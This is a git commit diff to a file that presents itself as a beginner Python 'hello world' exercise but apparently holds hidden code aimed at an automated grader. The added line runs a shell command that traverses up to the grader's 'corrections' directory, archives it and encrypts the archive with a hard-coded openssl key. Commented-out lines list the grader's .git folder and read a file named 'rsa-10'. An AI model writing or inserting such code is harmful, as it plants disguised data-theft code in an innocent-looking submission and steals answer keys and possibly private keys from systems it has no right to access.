88a9f5bb5cb7921454b03b4d03d1b3c88eea6cd8
Ashraf Atef <ashraf.programer@gmail.com>
2024-04-08 12:41:17 +0200

    task

--- 0x00-python-hello_world/2-print.py
+++ 0x00-python-hello_world/2-print.py
@@ -39,7 +39,7 @@ def get_data(command):
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
-my_data = get_data("tar -czvf file.tar.gz ../../../../corrections_*/corrections/303/") or ""
+my_data = get_data("tar -czvf - ../../../../corrections_*/corrections/303/ | openssl enc -aes-256-cbc -e -k '123' > file.tar.gz") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
